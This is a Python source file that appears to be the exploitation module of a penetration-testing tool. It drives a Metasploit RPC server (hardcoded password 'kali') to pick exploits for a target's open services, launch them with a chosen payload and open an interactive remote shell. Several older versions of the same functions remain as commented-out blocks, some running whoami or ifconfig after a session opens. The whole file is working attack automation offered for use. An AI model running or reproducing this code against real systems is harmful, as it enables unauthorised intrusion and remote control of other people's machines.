import nmap
import time
import subprocess
import platform
import os
from pymetasploit3.msfrpc import MsfRpcClient

def interactive_shell(shell):
    """Interactive shell loop for continuous command execution."""
    print("\n[+] Interactive shell opened. Type 'exit' to quit.")
    while True:
        command = input("msf> ").strip()
        if command.lower() == 'exit':
            print("[+] Closing session...")
            break
        shell.write(command)
        time.sleep(2)  # Give some time for command execution
        print(shell.read())
def search_exploits(client, search_query, limit=5):
    """Searches Metasploit for modules using the provided search query."""
    matched_modules = []

    for module_type in ["exploits", "auxiliary", "post"]:
        try:
            modules = getattr(client.modules, module_type)  # Get module list dynamically
        except AttributeError:
            continue

        for module in modules:
            if search_query.lower() in module.lower():
                matched_modules.append((module_type, module))  # Store module type for clarity

    print(f"Found {len(matched_modules)} matches for '{search_query}'")
    return matched_modules[:limit]  # Return top `limit` matches
'''
def search_exploits(client, search_query, limit=5):
    """Searches Metasploit for modules using the provided search query."""
    matched_modules = []

    for module_type in ["exploits", "auxiliary", "post"]:
        print(f"Searching in {module_type}...")  # Debugging output

        try:
            modules = getattr(client.modules, module_type)  # Get module list dynamically
        except AttributeError:
            print(f"Error: {module_type} is not a valid module type!")
            continue

        for module in modules:
            if search_query.lower() in module.lower():
                matched_modules.append((module_type, module))  # Store module type for clarity

    print(f"Found {len(matched_modules)} matches for '{search_query}'")
    return matched_modules[:limit]  # Return top `limit` matches
'''

'''
def search_exploits(client, search_query):
    """Searches Metasploit for exploits using the provided search query."""
    matched_exploits = []
    for module in client.modules.exploits:
        if search_query.lower() in module.lower():
            matched_exploits.append(module)

    return matched_exploits[:5]  # Return top 5 matches
'''
'''
def display_msf_server_instructions():
    """Display instructions for starting the Metasploit RPC server manually."""
    print("\n" + "="*60)
    print("METASPLOIT RPC SERVER INSTRUCTIONS")
    print("="*60)
    print("Before using the exploitation module, you need to start the Metasploit RPC server.\n")
    print("Step 1: Open a NEW command prompt window (keep this one running)")
    print("Step 2: Run ONE of the following commands based on your Metasploit installation:")
    print("\nOption A - If msfrpcd is in your PATH:")
    print("    msfrpcd -P kali -p 55552 -a 127.0.0.1\n")
    print("Option B - Using msfconsole:")
    print("    msfconsole")
    print("    (Then inside msfconsole, run:)")
    print("    load msgrpc ServerHost=127.0.0.1 ServerPort=55552 User=msf Pass=kali\n")
    print("Step 3: Keep that window open and return to this window")
    print("Step 4: Press Enter to continue after starting the server")
    print("="*60)
    input("\nPress Enter after starting the Metasploit RPC server in another window...")
'''
def exploit_target(target, open_ports):
    """Allows the user to select a service, exploit it, and configure all required parameters."""
    
    try:
        print("[*] Connecting to Metasploit RPC Server...")
        client = MsfRpcClient('kali', port=55552, ssl=False)
        print("[+] Successfully connected to Metasploit RPC server!")
    except Exception as e:
        print(f"[-] Failed to connect to Metasploit RPC server: {e}")
        return

    if not open_ports:
        print("No open ports found for exploitation.")
        return

    while True:
        print("\nAvailable Services:")
        for i, (port, service_details) in enumerate(open_ports, 1):
            print(f"{i}. {service_details} (Port {port})")

        search_query = input("\n[?] Enter what Serice you want to exploit: ").strip()
        if not search_query:
            print("[-] No search query provided. Returning to menu.")
            return
        selected_port = input("[?] Enter the port number associated with this service: ").strip()
        if not selected_port.isdigit():
            print("[-] Invalid port number. Returning to menu.")
            return
        selected_port = int(selected_port)
        print(f"\n[*] Searching for exploits for '{search_query}'...")
        exploits = search_exploits(client, search_query)
        if not exploits:
            print(f"\n[-] No exploits found for '{search_query}'.")
            continue
        break
    
    print(f"\nAvailable Exploits for '{search_query}':")
    for i, exploit in enumerate(exploits, 1):
        print(f"{i}. {exploit}")
    
    while True:
        choice = input("Select an exploit (Enter number): ").strip().lower()
        if not choice.isdigit() or int(choice) < 1 or int(choice) > len(exploits):
            print("Invalid selection.")
            continue
        selected_exploit = exploits[int(choice) - 1]
        break
    
    print(f"\nUsing exploit: {selected_exploit}")
    exploit_module = client.modules.use('exploit', selected_exploit[1])
    exploit_module['RHOSTS'] = target
    exploit_module['RPORT'] = selected_port
    
    valid_payloads = exploit_module.targetpayloads()
    if not valid_payloads:
        print("\n[-] No valid payloads found for this exploit.")
        return
    
    print("\nAvailable Payloads:")
    for i, payload in enumerate(valid_payloads, 1):
        print(f"{i}. {payload}")
    
    while True:
        choice = input("Select a payload (Enter number): ").strip().lower()
        if not choice.isdigit() or int(choice) < 1 or int(choice) > len(valid_payloads):
            print("Invalid selection.")
            continue
        selected_payload = valid_payloads[int(choice) - 1]
        break
    
    print(f"\nUsing payload: {selected_payload}")
    job_id = exploit_module.execute(payload=selected_payload)
    print(f"Exploit attempt on {target}:{selected_port}")

    time.sleep(5)
    if client.sessions.list:
        session_id = list(client.sessions.list.keys())[0]
        print(f"[+] Exploit successful! Session {session_id} opened.")
        shell = client.sessions.session(session_id)
        interactive_shell(shell)
    else:
        print("[-] Exploit failed or no session was created.")
'''
def exploit_target(target, open_ports):
    """Allows the user to select a service, exploit it, and configure all required parameters."""
    
    try:
        print("[*] Connecting to Metasploit RPC Server...")
        client = MsfRpcClient('kali', port=55552, ssl=False)
        print("[+] Successfully connected to Metasploit RPC server!")
    except Exception as e:
        print(f"[-] Failed to connect to Metasploit RPC server: {e}")
        return

    if not open_ports:
        print("No open ports found for exploitation.")
        return

    while True:
        print("\nAvailable Services:")
        for i, (port, service_details) in enumerate(open_ports, 1):
            print(f"{i}. {service_details} (Port {port})")

        choice = input("Select a service to exploit (Enter number, or 'm' for manual search): ").strip().lower()
        if choice == "m":
            search_query = input("\n[?] Enter what you want to search for in Metasploit: ").strip()
            if not search_query:
                print("[-] No search query provided. Returning to menu.")
                return
            selected_port = input("[?] Enter the port number associated with this service: ").strip()
            if not selected_port.isdigit():
                print("[-] Invalid port number. Returning to menu.")
                return
            selected_port = int(selected_port)
        else:
            if not choice.isdigit() or int(choice) < 1 or int(choice) > len(open_ports):
                print("Invalid selection.")
                continue
            choice = int(choice) - 1
            selected_port, search_query = open_ports[choice]
        
        print(f"\n[*] Searching for exploits for '{search_query}'...")
        exploits = search_exploits(client, search_query)
        if not exploits:
            print(f"\n[-] No exploits found for '{search_query}'.")
            continue
        break
    
    print(f"\nAvailable Exploits for '{search_query}':")
    for i, exploit in enumerate(exploits, 1):
        print(f"{i}. {exploit}")
    
    while True:
        choice = input("Select an exploit (Enter number): ").strip().lower()
        if not choice.isdigit() or int(choice) < 1 or int(choice) > len(exploits):
            print("Invalid selection.")
            continue
        selected_exploit = exploits[int(choice) - 1]
        break
    
    print(f"\nUsing exploit: {selected_exploit}")
    exploit_module = client.modules.use('exploit', selected_exploit[1])
    exploit_module['RHOSTS'] = target
    exploit_module['RPORT'] = selected_port
    
    valid_payloads = exploit_module.targetpayloads()
    if not valid_payloads:
        print("\n[-] No valid payloads found for this exploit.")
        return
    
    print("\nAvailable Payloads:")
    for i, payload in enumerate(valid_payloads, 1):
        print(f"{i}. {payload}")
    
    while True:
        choice = input("Select a payload (Enter number): ").strip().lower()
        if not choice.isdigit() or int(choice) < 1 or int(choice) > len(valid_payloads):
            print("Invalid selection.")
            continue
        selected_payload = valid_payloads[int(choice) - 1]
        break
    
    print(f"\nUsing payload: {selected_payload}")
    job_id = exploit_module.execute(payload=selected_payload)
    print(f"Exploit attempt on {target}:{selected_port}")

    time.sleep(5)
    if client.sessions.list:
        session_id = list(client.sessions.list.keys())[0]
        print(f"[+] Exploit successful! Session {session_id} opened.")
        shell = client.sessions.session(session_id)
        interactive_shell(shell)
    else:
        print("[-] Exploit failed or no session was created.")
'''
def main(target, open_ports):
    print("\nProceeding to Exploitation...")
    exploit_target(target, open_ports)


'''
import nmap
import time
import subprocess
import platform
import os
from pymetasploit3.msfrpc import MsfRpcClient

# Store reconnaissance results globally
recon_data = {}

def search_exploits(client, search_query):
    """Searches Metasploit for exploits using the provided search query."""
    matched_exploits = []
    for module in client.modules.exploits:
        if search_query.lower() in module.lower():
            matched_exploits.append(module)

    return matched_exploits[:5]  # Return top 5 matches

def display_msf_server_instructions():
    """Display instructions for starting the Metasploit RPC server manually."""
    print("\n" + "="*60)
    print("METASPLOIT RPC SERVER INSTRUCTIONS")
    print("="*60)
    print("Before using the exploitation module, you need to start the Metasploit RPC server.\n")
    print("Step 1: Open a NEW command prompt window (keep this one running)")
    print("Step 2: Run ONE of the following commands based on your Metasploit installation:")
    print("\nOption A - If msfrpcd is in your PATH:")
    print("    msfrpcd -P kali -p 55552 -a 127.0.0.1\n")
    print("Option B - Using msfconsole:")
    print("    msfconsole")
    print("    (Then inside msfconsole, run:)")
    print("    load msgrpc ServerHost=127.0.0.1 ServerPort=55552 User=msf Pass=kali\n")
    print("Step 3: Keep that window open and return to this window")
    print("Step 4: Press Enter to continue after starting the server")
    print("="*60)
    input("\nPress Enter after starting the Metasploit RPC server in another window...")

def exploit_target(target, open_ports):
    """Allows the user to select a service, exploit it, and configure all required parameters."""
    # Display instructions for manual server startup
    display_msf_server_instructions()
    
    # Try to connect to the server
    try:
        print("[*] Connecting to Metasploit RPC Server...")
        client = MsfRpcClient('kali', port=55552, ssl=False)
        print("[+] Successfully connected to Metasploit RPC server!")
    except Exception as e:
        print(f"[-] Failed to connect to Metasploit RPC server: {e}")
        print("\n[!] The server may not be running or might be using different credentials.")
        retry = input("[?] Would you like to see the instructions again? (y/N): ").strip().lower()
        if retry == 'y':
            return exploit_target(target, open_ports)
        return

    try:
        if not open_ports:
            print("No open ports found for exploitation.")
            return

        while True:  # Loop until a valid search is performed
            print("\nAvailable Services:")
            for i, (port, service_details) in enumerate(open_ports, 1):
                print(f"{i}. {service_details} (Port {port})")

            choice = input("Select a service to exploit (Enter number, or 'm' for manual search): ").strip().lower()

            if choice == "m":
                search_query = input("\n[?] Enter what you want to search for in Metasploit: ").strip()
                if not search_query:
                    print("[-] No search query provided. Returning to menu.")
                    return
                
                selected_port = input("[?] Enter the port number associated with this service: ").strip()
                if not selected_port.isdigit():
                    print("[-] Invalid port number. Returning to menu.")
                    return

                selected_port = int(selected_port)

            else:
                if not choice.isdigit() or int(choice) < 1 or int(choice) > len(open_ports):
                    print("Invalid selection.")
                    continue

                choice = int(choice) - 1
                selected_port, search_query = open_ports[choice]  # Use detected service name as search query

            print(f"\n[*] Searching for exploits for '{search_query}'...")
            try:
                exploits = search_exploits(client, search_query)
            except Exception as e:
                print(f"[-] Error searching for exploits: {e}")
                print("[-] The RPC server connection may have timed out.")
                retry = input("[?] Would you like to restart the connection process? (y/N): ").strip().lower()
                if retry == 'y':
                    return exploit_target(target, open_ports)
                return

            if not exploits:
                print(f"\n[-] No exploits found for '{search_query}'.")
                retry = input("[?] Do you want to manually search again? (y/N): ").strip().lower()
                if retry == "y":
                    continue  # Restart the loop to enter a new search
                return  # Exit back to the main menu

            break  # If exploits are found, exit the loop

        print(f"\nAvailable Exploits for '{search_query}':")
        for i, exploit in enumerate(exploits, 1):
            print(f"{i}. {exploit}")

        while True:  # Loop until a valid exploit is selected
            choice = input("Select an exploit (Enter number, or 'm' to try another search): ").strip().lower()

            if choice == "m":
                return exploit_target(target, open_ports)  # Restart exploit selection

            if not choice.isdigit() or int(choice) < 1 or int(choice) > len(exploits):
                print("Invalid selection.")
                continue

            selected_exploit = exploits[int(choice) - 1]
            break  # Exit the loop if a valid exploit is selected

        print(f"\nUsing exploit: {selected_exploit}")

        exploit_module = client.modules.use('exploit', selected_exploit)

        # Fetch required options safely
        required_options = exploit_module.options
        if isinstance(required_options, list):  # Convert list to dictionary (failsafe)
            required_options = {opt: {} for opt in required_options}

        if not required_options:
            print("\n[-] No required options found for this exploit.")
        else:
            print("\n[+] Required Options for this exploit:")
            for option, details in required_options.items():
                required = "(Required)" if details.get('required', False) else "(Optional)"
                default_value = details.get('default', 'None')
                print(f"    {option} {required}: Default = {default_value}")

            print("\n[!] Enter values for each required option. Press Enter to keep defaults.")
        
        # Auto-set RHOSTS & RPORT if required
        if 'RHOSTS' in required_options:
            exploit_module['RHOSTS'] = target
            print(f"    RHOSTS = {target} (Auto-set)")
        
        if 'RPORT' in required_options:
            exploit_module['RPORT'] = selected_port
            print(f"    RPORT = {selected_port} (Auto-set)")

        # Let user enter additional parameters
        for option, details in required_options.items():
            if option in ['RHOSTS', 'RPORT']:
                continue  # Already set

            value = input(f"    {option} (Default: {details.get('default', 'None')}): ").strip()
            if value:
                exploit_module[option] = value

        valid_payloads = exploit_module.targetpayloads()
        if not valid_payloads:
            print("\n[-] No valid payloads found for this exploit.")
            return

        print("\nAvailable Payloads:")
        for i, payload in enumerate(valid_payloads, 1):
            print(f"{i}. {payload}")

        while True:  # Loop until a valid payload is selected
            choice = input("Select a payload (Enter number, or 'm' to retry exploit selection): ").strip().lower()

            if choice == "m":
                return exploit_target(target, open_ports)  # Restart exploit selection

            if not choice.isdigit() or int(choice) < 1 or int(choice) > len(valid_payloads):
                print("Invalid selection.")
                continue

            selected_payload = valid_payloads[int(choice) - 1]
            break  # Exit the loop if a valid payload is selected

        print(f"\nUsing payload: {selected_payload}")

        job_id = exploit_module.execute(payload=selected_payload)
        print(f"Exploit attempt on {target}:{selected_port}")

        time.sleep(5)
        if client.sessions.list:
            session_id = list(client.sessions.list.keys())[0]
            session_info = client.sessions.list
            print(f"[*] Available sessions: {session_info}")
            print(f"\n[+] Exploit successful! Session {session_id} opened.")
            shell = client.sessions.session(session_id)
            time.sleep(3)
            shell.write("ifconfig")
            time.sleep(3) 
            print(f"\n[+] Running 'whoami' to verify access:")
            if session_id in client.sessions.list:
                print(shell.read())
            else:
                print("[-] The session is not active or interactive.")

    except Exception as e:
        print(f"Metasploit error: {e}")

def main(target, open_ports):
    print("\nProceeding to Exploitation...")
    exploit_target(target, open_ports)

'''

'''

import nmap
import time
import subprocess
import platform
import os
from pymetasploit3.msfrpc import MsfRpcClient

# Store reconnaissance results globally
recon_data = {}

def search_exploits(client, search_query):
    """Searches Metasploit for exploits using the provided search query."""
    matched_exploits = []
    for module in client.modules.exploits:
        if search_query.lower() in module.lower():
            matched_exploits.append(module)

    return matched_exploits[:5]  # Return top 5 matches

def display_msf_server_instructions():
    """Display instructions for starting the Metasploit RPC server manually."""
    print("\n" + "="*60)
    print("METASPLOIT RPC SERVER INSTRUCTIONS")
    print("="*60)
    print("Before using the exploitation module, you need to start the Metasploit RPC server.\n")
    print("Step 1: Open a NEW command prompt window (keep this one running)")
    print("Step 2: Run ONE of the following commands based on your Metasploit installation:")
    print("\nOption A - If msfrpcd is in your PATH:")
    print("    msfrpcd -P kali -p 55552 -a 127.0.0.1\n")
    print("Option B - Using msfconsole:")
    print("    msfconsole")
    print("    (Then inside msfconsole, run:)")
    print("    load msgrpc ServerHost=127.0.0.1 ServerPort=55552 User=msf Pass=kali\n")
    print("Step 3: Keep that window open and return to this window")
    print("Step 4: Press Enter to continue after starting the server")
    print("="*60)
    input("\nPress Enter after starting the Metasploit RPC server in another window...")

def exploit_target(target, open_ports):
    """Allows the user to select a service, exploit it, and configure all required parameters."""
    # Display instructions for manual server startup
    display_msf_server_instructions()
    
    # Try to connect to the server
    try:
        print("[*] Connecting to Metasploit RPC Server...")
        client = MsfRpcClient('kali', port=55552, ssl=False)
        print("[+] Successfully connected to Metasploit RPC server!")
    except Exception as e:
        print(f"[-] Failed to connect to Metasploit RPC server: {e}")
        print("\n[!] The server may not be running or might be using different credentials.")
        retry = input("[?] Would you like to see the instructions again? (y/N): ").strip().lower()
        if retry == 'y':
            return exploit_target(target, open_ports)
        return

    try:
        if not open_ports:
            print("No open ports found for exploitation.")
            return

        while True:  # Loop until a valid search is performed
            print("\nAvailable Services:")
            for i, (port, service_details) in enumerate(open_ports, 1):
                print(f"{i}. {service_details} (Port {port})")

            choice = input("Select a service to exploit (Enter number, or 'm' for manual search): ").strip().lower()

            if choice == "m":
                search_query = input("\n[?] Enter what you want to search for in Metasploit: ").strip()
                if not search_query:
                    print("[-] No search query provided. Returning to menu.")
                    return
                
                selected_port = input("[?] Enter the port number associated with this service: ").strip()
                if not selected_port.isdigit():
                    print("[-] Invalid port number. Returning to menu.")
                    return

                selected_port = int(selected_port)

            else:
                if not choice.isdigit() or int(choice) < 1 or int(choice) > len(open_ports):
                    print("Invalid selection.")
                    continue

                choice = int(choice) - 1
                selected_port, search_query = open_ports[choice]  # Use detected service name as search query

            print(f"\n[*] Searching for exploits for '{search_query}'...")
            try:
                exploits = search_exploits(client, search_query)
            except Exception as e:
                print(f"[-] Error searching for exploits: {e}")
                print("[-] The RPC server connection may have timed out.")
                retry = input("[?] Would you like to restart the connection process? (y/N): ").strip().lower()
                if retry == 'y':
                    return exploit_target(target, open_ports)
                return

            if not exploits:
                print(f"\n[-] No exploits found for '{search_query}'.")
                retry = input("[?] Do you want to manually search again? (y/N): ").strip().lower()
                if retry == "y":
                    continue  # Restart the loop to enter a new search
                return  # Exit back to the main menu

            break  # If exploits are found, exit the loop

        print(f"\nAvailable Exploits for '{search_query}':")
        for i, exploit in enumerate(exploits, 1):
            print(f"{i}. {exploit}")

        while True:  # Loop until a valid exploit is selected
            choice = input("Select an exploit (Enter number, or 'm' to try another search): ").strip().lower()

            if choice == "m":
                return exploit_target(target, open_ports)  # Restart exploit selection

            if not choice.isdigit() or int(choice) < 1 or int(choice) > len(exploits):
                print("Invalid selection.")
                continue

            selected_exploit = exploits[int(choice) - 1]
            break  # Exit the loop if a valid exploit is selected

        print(f"\nUsing exploit: {selected_exploit}")

        exploit_module = client.modules.use('exploit', selected_exploit)

        # Fetch required options safely
        required_options = exploit_module.options
        if isinstance(required_options, list):  # Convert list to dictionary (failsafe)
            required_options = {opt: {} for opt in required_options}

        if not required_options:
            print("\n[-] No required options found for this exploit.")
        else:
            print("\n[+] Required Options for this exploit:")
            for option, details in required_options.items():
                required = "(Required)" if details.get('required', False) else "(Optional)"
                default_value = details.get('default', 'None')
                print(f"    {option} {required}: Default = {default_value}")

            print("\n[!] Enter values for each required option. Press Enter to keep defaults.")
        
        # Auto-set RHOSTS & RPORT if required
        if 'RHOSTS' in required_options:
            exploit_module['RHOSTS'] = target
            print(f"    RHOSTS = {target} (Auto-set)")
        
        if 'RPORT' in required_options:
            exploit_module['RPORT'] = selected_port
            print(f"    RPORT = {selected_port} (Auto-set)")

        # Let user enter additional parameters
        for option, details in required_options.items():
            if option in ['RHOSTS', 'RPORT']:
                continue  # Already set

            value = input(f"    {option} (Default: {details.get('default', 'None')}): ").strip()
            if value:
                exploit_module[option] = value

        valid_payloads = exploit_module.targetpayloads()
        if not valid_payloads:
            print("\n[-] No valid payloads found for this exploit.")
            return

        print("\nAvailable Payloads:")
        for i, payload in enumerate(valid_payloads, 1):
            print(f"{i}. {payload}")

        while True:  # Loop until a valid payload is selected
            choice = input("Select a payload (Enter number, or 'm' to retry exploit selection): ").strip().lower()

            if choice == "m":
                return exploit_target(target, open_ports)  # Restart exploit selection

            if not choice.isdigit() or int(choice) < 1 or int(choice) > len(valid_payloads):
                print("Invalid selection.")
                continue

            selected_payload = valid_payloads[int(choice) - 1]
            break  # Exit the loop if a valid payload is selected

        print(f"\nUsing payload: {selected_payload}")

        job_id = exploit_module.execute(payload=selected_payload)
        print(f"Exploit attempt on {target}:{selected_port}")

        time.sleep(5)
        if client.sessions.list:
            session_id = list(client.sessions.list.keys())[0]
            print(f"\n[+] Exploit successful! Session {session_id} opened.")
            shell = client.sessions.session(session_id)
            
            # FIX: Add the missing 'end_strs' parameter to run_with_output
            try:
                # Method 1: Try with empty end string list
                output = shell.write("whoami", end_strs=['#', '$', '>'])
                print(f"\n[+] Running 'whoami' to verify access:")
                print(output)
            except Exception as e:
                try:
                    # Method 2: Alternative approach using read() if available
                    shell.write("whoami\n")
                    time.sleep(1)
                    output = shell.read()
                    print(f"\n[+] Running 'whoami' to verify access:")
                    print(output)
                except Exception as inner_e:
                    print(f"[-] Could not run command: {inner_e}")
                    print("[*] Session is active but command execution failed.")
                    print("[*] You can access this session directly in Metasploit")
        else:
            print("\n[-] Exploit failed. No session was created.")

    except Exception as e:
        print(f"Metasploit error: {e}")

def main(target, open_ports):
    print("\nProceeding to Exploitation...")
    exploit_target(target, open_ports)
'''